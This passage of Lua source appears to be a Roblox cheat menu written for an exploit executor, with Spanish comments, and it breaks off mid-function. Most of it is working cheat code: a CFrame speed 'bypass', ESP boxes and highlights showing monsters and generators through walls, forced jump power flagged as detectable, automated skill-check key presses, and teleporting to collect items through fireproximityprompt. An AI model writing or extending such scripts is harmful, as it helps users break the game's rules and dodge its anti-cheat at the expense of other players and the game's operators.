-- StarterGui.DebugVersion.Title.script_content.options.TextButton.LocalScript
local function C_38()
	local script = G2L["38"];
	local function Debug(str, keynum)
		if script.Parent.Parent.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end



	local TargetToChangeBackGroundColor = script.Parent.Parent.Parent.pages

	local ColourList = {
		Color3.fromRGB(255, 0, 0),
		Color3.fromRGB(0, 255, 0),
		Color3.fromRGB(0, 0, 255),
		Color3.fromRGB(255, 255, 0),
		Color3.fromRGB(255, 0, 255),
		Color3.fromRGB(0, 255, 255),
		Color3.fromRGB(255, 170, 0),
	}
	local index = 1
	local TweenService = game:GetService("TweenService")

	local function changetext()
		script.Parent.Text = "Change Pages Bar Color ["..index.."]"
		script.Parent.BackgroundColor3 = ColourList[index]
	end
	script.Parent.MouseButton1Click:Connect(function()
		Debug("changed pages bar color to "..index, 4)
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
		local tween = TweenService:Create(TargetToChangeBackGroundColor, tweenInfo, {
			BackgroundColor3 = ColourList[index]})
		tween:Play()
		index = index + 1
		if index > #ColourList then
			index = 1
		end
		changetext()
	end)
end;
task.spawn(C_38);
-- StarterGui.DebugVersion.Title.script_content.options.TextButton.LocalScript
local function C_3a()
	local script = G2L["3a"];
	local function Debug(str, keynum)
		if script.Parent.Parent.debug.Visible == true then return end

		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end


	local TargetToChangeBackGroundColor = script.Parent.Parent.Parent.Parent.script_content

	local ColourList = {
		Color3.fromRGB(255, 0, 0),
		Color3.fromRGB(0, 255, 0),
		Color3.fromRGB(0, 0, 255),
		Color3.fromRGB(255, 255, 0),
		Color3.fromRGB(255, 0, 255),
		Color3.fromRGB(0, 255, 255),
		Color3.fromRGB(255, 170, 0),
	}
	local index = 1
	local TweenService = game:GetService("TweenService")

	local function changetext()
		script.Parent.Text = "Change All Pages Color ["..index.."]"
		script.Parent.BackgroundColor3 = ColourList[index]
	end
	script.Parent.MouseButton1Click:Connect(function()
		Debug("changed all pages color to "..index, 4)
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
		local tween = TweenService:Create(TargetToChangeBackGroundColor, tweenInfo, {
			BackgroundColor3 = ColourList[index]})
		tween:Play()
		index = index + 1
		if index > #ColourList then
			index = 1
		end
		changetext()
	end)
end;
task.spawn(C_3a);
-- StarterGui.DebugVersion.Title.script_content.options.debug.LocalScript
local function C_3c()
	local script = G2L["3c"];
	local function Debug(str, keynum)
		local function checkifdebugisactive()

		end
		if keynum == 1 then --just a message
			print("[DEBUG]: "..str)
		elseif keynum == 2 then --warning
			print("[DEBUG_WARN]: "..str)
		elseif keynum == 3 then --error
			print("[DEBUG_ERROR]: "..str)
		elseif keynum == 4 then --sucess
			print("[DEBUG_SUCESS]: "..str)
		elseif not keynum then
			print("[¿DEBUG?]: "..str)
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible = false
		Debug("Now DEBUG is active", 4)
	end)
end;
task.spawn(C_3c);
-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton.LocalScript
local function C_41()
	local script = G2L["41"];
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	local function notify(arg, arg2)
		game.StarterGui:SetCore("SendNotification", {
			Title = arg,
			Text = arg2,
			Duration = 5
		})
	end
	local Button = script.Parent

	local Link = "https://www.youtube.com/watch?v=wkwNGtgA3z0&t=17s"

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Clipboard", "Copied to clipboard")
		else
			notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
		end
	end

	Button.MouseButton1Click:Connect(function()
		print("Copying Link to Clipboard")
		toClipboard(Link)
	end)
end;
task.spawn(C_41);
-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton.LocalScript
local function C_43()
	local script = G2L["43"];
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	local function notify(arg, arg2)
		game.StarterGui:SetCore("SendNotification", {
			Title = arg,
			Text = arg2,
			Duration = 5
		})
	end
	local Button = script.Parent

	local Link = "https://www.youtube.com/@G0bbyD0llan57-ee1vl?sub_confirmation=1"

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Clipboard", "Copied to clipboard")
		else
			notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
		end
	end

	Button.MouseButton1Click:Connect(function()
		print("Copying Link to Clipboard")
		toClipboard(Link)
	end)
end;
task.spawn(C_43);
-- StarterGui.DebugVersion.Title.script_content.options.Frame.ImageLabel.LocalScript
local function C_46()
	local script = G2L["46"];
	-- Tabla de imágenes
	local ImagesTable = {
		"http://www.roblox.com/asset/?id=77287185568809", 
		"http://www.roblox.com/asset/?id=100259167777492", 
		"http://www.roblox.com/asset/?id=124125757363608", 
		"http://www.roblox.com/asset/?id=18977064380", 
		"http://www.roblox.com/asset/?id=91257219257150", 
		"http://www.roblox.com/asset/?id=95050315511847", 
		"http://www.roblox.com/asset/?id=18926747165", 
		"http://www.roblox.com/asset/?id=18563945202", 
		"http://www.roblox.com/asset/?id=96314251205548", 
		"http://www.roblox.com/asset/?id=18431812183", 
		"http://www.roblox.com/asset/?id=18788179043", 
		"http://www.roblox.com/asset/?id=70893948167855", 
		"http://www.roblox.com/asset/?id=104839855000402", 
		"http://www.roblox.com/asset/?id=137314879944258", 
		"http://www.roblox.com/asset/?id=73699262591105", 
		"http://www.roblox.com/asset/?id=72803582962750", 
		"http://www.roblox.com/asset/?id=131130084722282", 
		"http://www.roblox.com/asset/?id=18907808707", 
		"http://www.roblox.com/asset/?id=72600671078602", 
		"http://www.roblox.com/asset/?id=74512491095129", 
		"http://www.roblox.com/asset/?id=106453564374243", 
		"http://www.roblox.com/asset/?id=18585426561", 
		"http://www.roblox.com/asset/?id=79026186394895", 
		"http://www.roblox.com/asset/?id=106015815287806", 
		"http://www.roblox.com/asset/?id=110718070667543", 
		"http://www.roblox.com/asset/?id=103335894082061", 
		"http://www.roblox.com/asset/?id=90286655595978", 
		"http://www.roblox.com/asset/?id=74182748336294", 
		"http://www.roblox.com/asset/?id=74984022534243", 
		"http://www.roblox.com/asset/?id=112543687157649", 
		"http://www.roblox.com/asset/?id=73360638489330", 
		"http://www.roblox.com/asset/?id=121531442476313", 
		"http://www.roblox.com/asset/?id=77584714499630", 
		"http://www.roblox.com/asset/?id=85361738200392", 
		"http://www.roblox.com/asset/?id=128017601857826", 
		"http://www.roblox.com/asset/?id=115058713838947", 
		"http://www.roblox.com/asset/?id=138881083500383", 
		"http://www.roblox.com/asset/?id=19004459587", 
		"http://www.roblox.com/asset/?id=79811464218127", 
		"http://www.roblox.com/asset/?id=129416203567766", 
		"http://www.roblox.com/asset/?id=112132109735822", 
		"http://www.roblox.com/asset/?id=110396773534658", 
		"http://www.roblox.com/asset/?id=15173361095",
		"http://www.roblox.com/asset/?id=134767081043107", 
		"http://www.roblox.com/asset/?id=95180389684758", 
		"http://www.roblox.com/asset/?id=18929716396",
		"http://www.roblox.com/asset/?id=18627984552",
		"http://www.roblox.com/asset/?id=18430005159", 
		"http://www.roblox.com/asset/?id=91486465304137",
		"http://www.roblox.com/asset/?id=18681235673",
		"http://www.roblox.com/asset/?id=119406785849532",
		"http://www.roblox.com/asset/?id=18628384290",
		"http://www.roblox.com/asset/?id=89275157754200",
		"http://www.roblox.com/asset/?id=85351521049671",
		"http://www.roblox.com/asset/?id=127772618013047",
		"http://www.roblox.com/asset/?id=113429792810767", 
		"http://www.roblox.com/asset/?id=18269733613",
		"http://www.roblox.com/asset/?id=18701736356",
		"http://www.roblox.com/asset/?id=103626122422576",
		"http://www.roblox.com/asset/?id=138647068846178", 
		"http://www.roblox.com/asset/?id=18701738485",
		"http://www.roblox.com/asset/?id=18636585646", 
		"http://www.roblox.com/asset/?id=111476160811736",
		"http://www.roblox.com/asset/?id=18659122523",
		"http://www.roblox.com/asset/?id=121237530559126",
		"http://www.roblox.com/asset/?id=102922366335352",
		"http://www.roblox.com/asset/?id=87487927092906",
		"http://www.roblox.com/asset/?id=86048663360997",
		"http://www.roblox.com/asset/?id=98706748559982",
		"http://www.roblox.com/asset/?id=18358793520", 
		"http://www.roblox.com/asset/?id=18963897536", 
		"http://www.roblox.com/asset/?id=105883957085079",
		"http://www.roblox.com/asset/?id=80585155841381", 
		"http://www.roblox.com/asset/?id=71684961018862",
		"http://www.roblox.com/asset/?id=134428371954918",
		"http://www.roblox.com/asset/?id=18464923724", 
		"http://www.roblox.com/asset/?id=18912206213"
	}



	-- Referencia al ImageLabel
	local imageLabel = script.Parent

	-- Función para cambiar la imagen a una aleatoria
	local function changeImage()
		-- Seleccionar una imagen aleatoria de la tabla
		local randomIndex = math.random(1, #ImagesTable)
		local randomImage = ImagesTable[randomIndex]

		-- Asignar la nueva imagen al ImageLabel
		imageLabel.Image = randomImage
	end

	-- Bucle infinito para alternar imágenes
	while true do
		changeImage()
		-- Esperar entre 10 y 15 segundos
		task.wait(math.random(4, 5))
	end

end;
task.spawn(C_46);
-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton.LocalScript
local function C_48()
	local script = G2L["48"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.ImageLabel.Visible = not 	script.Parent.Parent.ImageLabel.Visible 
		if 	script.Parent.Parent.ImageLabel.Visible then
			script.Parent.BackgroundColor3 = Color3.new(1, 0, 0)

		else
			script.Parent.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)
end;
task.spawn(C_48);
-- StarterGui.DebugVersion.Title.script_content.Main.speed.LocalScript
local function C_4e()
	local script = G2L["4e"];
	local TweenService = game:GetService("TweenService")
	local starterGui = game:GetService("StarterGui")
	local button = script.Parent
	local localPlayer = game:GetService("Players").LocalPlayer
	local isRunning = false -- Iniciar con la funcionalidad desactivada
	local multiplier = 1.5 -- Multiplicador de velocidad
	local greenColor = Color3.fromRGB(0, 255, 0) -- Verde
	local whiteColor = Color3.fromRGB(255, 255, 255) -- Blanco
	local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)

	-- Función para cambiar color del botón
	local function tweenToColor(targetColor)
		return TweenService:Create(button, tweenInfo, {BackgroundColor3 = targetColor})
	end

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end
		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5,
			Icon = icon
		})

		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Cambiar color del botón al pasar el ratón
	button.MouseEnter:Connect(function()
		local tween = tweenToColor(greenColor) -- Cambiar a verde
		tween:Play()
	end)

	button.MouseLeave:Connect(function()
		local tween = tweenToColor(whiteColor) -- Cambiar a blanco
		tween:Play()
	end)
	script.Parent.Parent.Parent.options.TextBox.FocusLost:Connect(function()
		local newSpeed = tonumber(script.Parent.Parent.Parent.options.TextBox.Text)
		if newSpeed then
			multiplier = newSpeed
		else
			sendNotificationWithSound("Error", "La velocidad ingresada no es válida", "12222216", "error")
		end
	end)
	-- Función para verificar si el jugador está en movimiento
	local function isMoving()
		local character = localPlayer.Character
		if character and character:FindFirstChild("Humanoid") then
			local moveDirection = character.Humanoid.MoveDirection
			return moveDirection.Magnitude > 0 and not character.Humanoid.Sit and not character.Humanoid.PlatformStand
		end
		return false
	end

	-- Bucle de movimiento con bypass de velocidad
	task.spawn(function()
		while true do
			task.wait()
			if isRunning and isMoving() then
				local character = localPlayer.Character
				if character and character:FindFirstChild("HumanoidRootPart") then
					-- Aplicar el bypass de velocidad
					character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame + character.Humanoid.MoveDirection * multiplier
					game:GetService("RunService").Stepped:Wait() -- Esperar un ciclo del juego para la ejecución fluida
				end
			end
		end
	end)

	-- Función para alternar (activar/desactivar) la funcionalidad al presionar el botón
	button.MouseButton1Click:Connect(function()
		isRunning = not isRunning -- Cambiar el estado de activado/desactivado

		if isRunning then
			sendNotificationWithSound("Speed!", "Active. ¡Now you can move faster!", "478544929")
			tweenToColor(greenColor):Play() -- Cambiar color a verde cuando esté activo
		else
			sendNotificationWithSound("Speed!", "Inactive. you back to old speed.", "478544929")
			tweenToColor(whiteColor):Play() -- Cambiar color a blanco cuando esté inactivo
		end
	end)

end;
task.spawn(C_4e);
-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
local function C_53()
	local script = G2L["53"];
	local starterGui = game:GetService("StarterGui")
	local TweenService = game:GetService("TweenService")
	local runservice = game:GetService("RunService")
	local camera = game:GetService("Workspace").CurrentCamera

	-- Configuración del ESP
	local Settings = {
		Box_Color = Color3.fromRGB(255, 0, 0), -- Color de las cajas
		Box_Thickness = 1 -- Grosor de las cajas
	}

	-- Crear una nueva caja (Quad) para el ESP
	local function NewQuad(thickness, color)
		local quad = Drawing.new("Quad")
		quad.Visible = false
		quad.PointA = Vector2.new(0, 0)
		quad.PointB = Vector2.new(0, 0)
		quad.PointC = Vector2.new(0, 0)
		quad.PointD = Vector2.new(0, 0)
		quad.Color = color
		quad.Filled = false
		quad.Thickness = thickness
		quad.Transparency = 1
		return quad
	end

	-- Función para enviar notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon
		})

		-- Reproducir sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido cuando termine
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Función para aplicar ESP a los monstruos
	local function applyMonsterESP(monster)
		local espBox = NewQuad(Settings.Box_Thickness, Settings.Box_Color)

		local function updateESP()
			local connection
			connection = runservice.RenderStepped:Connect(function()
				if monster:FindFirstChild("HumanoidRootPart") then
					local rootPos, onScreen = camera:WorldToViewportPoint(monster.HumanoidRootPart.Position)
					if onScreen then
						-- Obtener las posiciones y calcular el tamaño de la caja
						local headPos = camera:WorldToViewportPoint(monster.Head.Position)
						local distanceY = math.clamp((Vector2.new(headPos.X, headPos.Y) - Vector2.new(rootPos.X, rootPos.Y)).Magnitude, 2, math.huge)

						-- Configurar la caja del ESP alrededor del monstruo
						espBox.PointA = Vector2.new(rootPos.X + distanceY, rootPos.Y - distanceY * 2)
						espBox.PointB = Vector2.new(rootPos.X - distanceY, rootPos.Y - distanceY * 2)
						espBox.PointC = Vector2.new(rootPos.X - distanceY, rootPos.Y + distanceY * 2)
						espBox.PointD = Vector2.new(rootPos.X + distanceY, rootPos.Y + distanceY * 2)
						espBox.Visible = true
					else
						espBox.Visible = false
					end
				else
					espBox.Visible = false
					connection:Disconnect()
				end
			end)
		end

		coroutine.wrap(updateESP)()
	end

	-- Función para buscar monstruos y aplicarles ESP
	local function toggleMonsterESP()
		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
		if not currentRoom then
			sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
			return
		end

		local hasMonsters = false
		for _, roomModel in pairs(currentRoom:GetChildren()) do
			if roomModel:IsA("Model") then
				local monstersFolder = roomModel:FindFirstChild("Monsters")
				if not monstersFolder then
					sendNotificationWithSound("Error", "Monsters folder not found!", "478544929", "error")
					return
				end

				for _, monster in pairs(monstersFolder:GetChildren()) do
					if monster:IsA("Model") and monster:FindFirstChild("Humanoid") then
						hasMonsters = true
						sendNotificationWithSound("ESP", "Applying ESP to " .. monster.Name, 478544929)
						applyMonsterESP(monster)
					end
				end
			end
		end

		if not hasMonsters then
			sendNotificationWithSound("Error", "No monsters found!", "478544929", "error")
		end
	end

	-- Crear un botón para activar/desactivar el ESP
	local button = script.Parent
	button.MouseButton1Click:Connect(function()
		toggleMonsterESP()
	end)

end;
task.spawn(C_53);
-- StarterGui.DebugVersion.Title.script_content.Main.generators.LocalScript
local function C_56()
	local script = G2L["56"];
	local starterGui = game:GetService("StarterGui")
	local runservice = game:GetService("RunService")

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon, -- Establecer el ícono basado en el tipo de notificación
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Definir la variable esp
	local NewREsp = Instance.new("Highlight")
	NewREsp.Name = "hl2"
	NewREsp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	NewREsp.OutlineTransparency = 1

	-- Obtener el botón
	local button = script.Parent
	local isActiveGeneratorESP = false -- Estado del toggle

	-- Definir los colores
	local greenColor = Color3.fromRGB(0, 255, 0) -- Verde
	local whiteColor = Color3.fromRGB(255, 255, 255) -- Blanco

	-- Configurar la información del Tween
	local tweenInfo = TweenInfo.new(
		0.2, -- Duración del Tween (0.2 segundos para un cambio rápido)
		Enum.EasingStyle.Sine, -- Suavizado Sine para un cambio suave
		Enum.EasingDirection.Out -- Suavizado hacia afuera (Out)
	)

	-- Crear los Tweens
	local function tweenToColorR(targetColor)
		local tween = game.TweenService:Create(button, tweenInfo, {BackgroundColor3 = targetColor})
		tween:Play()
	end

	-- Definir la lógica para alternar el código cuando se presiona el botón
	local function toggleGenerators()
		if isActiveGeneratorESP then
			isActiveGeneratorESP = false
			tweenToColorR(whiteColor) -- Cambiar el color del botón a blanco cuando está inactivo
		else
			isActiveGeneratorESP = true
			tweenToColorR(greenColor) -- Cambiar el color del botón a verde cuando está activo

			-- Ejecutar la lógica
			task.spawn(function()
				local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
				if not currentRoom then
					sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
					return
				end

				local hasGenerators = false -- Variable para verificar si hay generadores
				for _, l in pairs(currentRoom:GetChildren()) do
					if l:IsA("Model") then
						local room = l
						local generatorsFolder = room:FindFirstChild("Generators")
						if not generatorsFolder then
							sendNotificationWithSound("Error", "Generators folder not found!", "478544929", "error")
							return
						end

						hasGenerators = true
						for _, b in pairs(generatorsFolder:GetChildren()) do
							local folderR = b
							runservice.Heartbeat:Connect(function()
								for _, b in pairs(folderR:GetChildren()) do
									if b:IsA("BasePart") then -- Detectar solo BaseParts
										if not b:FindFirstChild("hl2") then
											sendNotificationWithSound("ESP", "Cloning ESP to " .. b.Name, 478544929)
											local hl2clone = NewREsp:Clone()
											hl2clone.Adornee = b
											hl2clone.Parent = b
										end
									end
								end
							end)
						end
					end
				end

				if not hasGenerators then
					sendNotificationWithSound("Error", "No generators found in the current room!", "478544929", "error")
				end
			end)
		end
	end

	-- Detectar cuando se hace clic en el botón
	button.MouseButton1Click:Connect(function()
		toggleGenerators()
	end)

end;
task.spawn(C_56);
-- StarterGui.DebugVersion.Title.script_content.Main.speed.LocalScript
local function C_5b()
	local script = G2L["5b"];
	-- Obtener TweenService
	local TweenService = game:GetService("TweenService")

	-- Obtener el botón
	local button = script.Parent

	-- Definir los colores
	local greenColor = Color3.fromRGB(0, 255, 0) -- Verde
	local whiteColor = Color3.fromRGB(255, 255, 255) -- Blanco

	-- Configurar la información del Tween
	local tweenInfo = TweenInfo.new(
		0.2, -- Duración del Tween (0.2 segundos para un cambio rápido)
		Enum.EasingStyle.Sine, -- Suavizado Sine para un cambio suave
		Enum.EasingDirection.Out -- Suavizado hacia afuera (Out)
	)

	-- Crear los Tweens
	local function tweenToColor(targetColor)
		return TweenService:Create(button, tweenInfo, {BackgroundColor3 = targetColor})
	end

	-- Detectar cuando el mouse entra en el botón
	button.MouseEnter:Connect(function()
		local tween = tweenToColor(greenColor) -- Cambiar a verde
		tween:Play()
	end)

	-- Detectar cuando el mouse sale del botón
	button.MouseLeave:Connect(function()
		local tween = tweenToColor(whiteColor) -- Cambiar a blanco
		tween:Play()
	end)

	-- Obtener StarterGui
	local starterGui = game:GetService("StarterGui")

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		-- Configurar el ícono de la notificación basado en el tipo
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos

		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	-- Al hacer clic en el botón
	script.Parent.MouseButton1Click:Connect(function()
		local localPlayer = game:GetService("Players").LocalPlayer
		local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
		local isRunning = true -- Comenzar activado

		-- EnviAar notificacióN que el SpeEd fue CarGadO
		sendNotificationWithSound("¡AllowJump!", "Loaded. ¡Now you can jump!", "478544929")
		wait(2)
		sendNotificationWithSound("can be dectected!", "Be careful where you jump!", "478544929")

		-- Aumentar los parámetros de salto
		task.spawn(function()
			while isRunning and humanoid do
				humanoid.JumpPower = 55 -- Cambiar JumpPower a 50
				humanoid.UseJumpPower = true -- Activar el uso de JumpPower
				humanoid.JumpHeight = 7.3 -- Cambiar JumpHeight a 7.3
				task.wait(1) -- Pausa para evitar que se sobrecargue el ciclo
			end
		end)
	end)

end;
task.spawn(C_5b);
-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
local function C_60()
	local script = G2L["60"];
	-- Servicios
	local VirtualInputManager = game:GetService("VirtualInputManager")
	local player = game:GetService("Players").LocalPlayer

	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end



	if  player.PlayerGui.ScreenGui:FindFirstChild("Menu") == nil then
		wait(5)
		sendNotificationWithSound("Error", "menu does not exists", 478544929)
		wait(100000)
	end

	script.Parent.MouseButton1Click:Connect(function()
		-- Place this script in StarterPlayerScripts

		local player = game.Players.LocalPlayer
		local VirtualInputManager = game:GetService('VirtualInputManager')

		-- Define the tolerance range
		local TOLERANCE = 5 -- Adjust this value as needed

		-- Function to handle skill check alignment
		local function handleSkillCheck()
			local screenGui = player.PlayerGui:FindFirstChild("ScreenGui")
			if not screenGui then
				return
			end

			local menu = screenGui:FindFirstChild("Menu")
			if not menu then
				return
			end

			local skillCheckFrame = menu:FindFirstChild("SkillCheckFrame")
			if not skillCheckFrame then
				return
			end

			-- Function to perform the check when skill check frame is visible
			local function onVisibilityChanged()
				if skillCheckFrame.Visible then
					local marker = skillCheckFrame:FindFirstChild("Marker")
					local goldArea = skillCheckFrame:FindFirstChild("GoldArea")

					if marker and goldArea then
						local markerPosition = marker.AbsolutePosition
						local goldAreaPosition = goldArea.AbsolutePosition
						local goldAreaSize = goldArea.AbsoluteSize

						-- Check if the Marker is within the bounds of the GoldArea
						if markerPosition.X >= goldAreaPosition.X and markerPosition.X <= (goldAreaPosition.X + goldAreaSize.X) + TOLERANCE then
							-- Send spacebar press event
							VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
						end
					end
				end
			end

			-- Connect to the VisibilityChanged event
			skillCheckFrame.Changed:Connect(function(property)
				if property == "Visible" then
					onVisibilityChanged()
				end
			end)

			-- Detect changes in Marker and GoldArea positions
			local marker = skillCheckFrame:FindFirstChild("Marker")
			local goldArea = skillCheckFrame:FindFirstChild("GoldArea")

			if marker then
				marker.Changed:Connect(function(property)
					if property == "AbsolutePosition" then
						onVisibilityChanged()
					end
				end)
			end

			if goldArea then
				goldArea.Changed:Connect(function(property)
					if property == "AbsolutePosition" or property == "AbsoluteSize" then
						onVisibilityChanged()
					end
				end)
			end
		end

		-- Start handling the skill check
		handleSkillCheck()
	end)
end;
task.spawn(C_60);
-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
local function C_63()
	local script = G2L["63"];
	local starterGui = game:GetService("StarterGui")
	local runservice = game:GetService("RunService")

	-- Función para enviar una notificación con sonido
	local function sendNotificationWithSound(title, text, soundId, typeofnotif)
		local icon
		if typeofnotif == "error" then
			icon = "rbxassetid://2592670449" -- Ícono de error
		elseif typeofnotif == "warning" then
			icon = "rbxassetid://17453328281" -- Ícono de advertencia
		else
			icon = "rbxassetid://12900311435" -- Ícono de mensaje
		end

		starterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 5, -- Duración de la notificación en segundos
			Icon = icon, -- Establecer el ícono basado en el tipo de notificación
		})

		-- Crear y reproducir un sonido
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://" .. soundId
		sound.Parent = workspace
		sound:Play()

		-- Destruir el sonido una vez que termine de reproducirse
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local player = game.Players.LocalPlayer
	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
	local playerGui = player:WaitForChild("PlayerGui")



	local button = script.Parent -- Asume que este script está dentro de un botón
	local proximityPrompts = {} -- Tabla para almacenar los ProximityPrompts

	-- Buscar todos los Items y sus ProximityPrompts en cada modelo de CurrentRoom


	-- Función para teletransportar al jugador y activar el ProximityPrompt
	local function activateProximityPrompts()
		local originalPosition = player.Character.HumanoidRootPart.Position -- Guardar posición original

		for _, prompt in ipairs(proximityPrompts) do
			-- Teletransportar al jugador al Tape

			sendNotificationWithSound("Going To", "the tape",  "478544929")
			local tapePosition = prompt.Parent.Position -- Posición del Tape
			player.Character.HumanoidRootPart.CFrame = CFrame.new(tapePosition) -- Teletransporta al jugador

			-- Esperar un momento para asegurar que el jugador esté en la posición correcta
			wait(0.5)

			-- Activar el ProximityPrompt
			if prompt then
				fireproximityprompt(prompt) -- Llama a la función para activar el ProximityPrompt
				wait(0.5) -- Esperar un poco antes de continuar
			end
		end

		-- Regresar al jugador a su posición original
		player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
	end

	-- Conectar la función al evento del botón
	button.MouseButton1Click:Connect(function()
		table.clear(proximityPrompts) -- Vaciar la lista antes de llenarla nuevamente
		wait() 
		local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")

		if not currentRoom then
			sendNotificationWithSound("Error", "CurrentRoom not found!", "478544929", "error")
			return
		end

		for _, roomModel in pairs(currentRoom:GetChildren()) do
			if roomModel:IsA("Model") then
				local itemsFolder = roomModel:FindFirstChild("Items")

				if not itemsFolder then
					sendNotificationWithSound("Error", "Items folder not found in " .. roomModel.Name, "478544929", "error")
					return
				end

				-- Buscar todos los Tapes y sus ProximityPrompts en la carpeta Items
				for _, item in pairs(itemsFolder:GetChildren()) do
					if item.Name:lower() == "tape" and item:FindFirstChild("Prompt") and item.Prompt:FindFirstChild("ProximityPrompt") then
						sendNotificationWithSound("Tapes List", "Inserting tape",  "478544929")
						table.insert(proximityPrompts, item.Prompt.ProximityPrompt)
					end
				end
			end
		end
		wait(1)

		if #proximityPrompts > 0 then
			activateProximityPrompts() -- Activar los ProximityPrompts
		else
			sendNotificationWithSound("Error", "No tapes found!", "478544929", "error")
		end
	end)

end;
task.spawn(C_63);
-- StarterGui.DebugVersion.Title.script_content.Main.itemsesp.LocalScript
local function C_66()
	local script = G2L["66"];
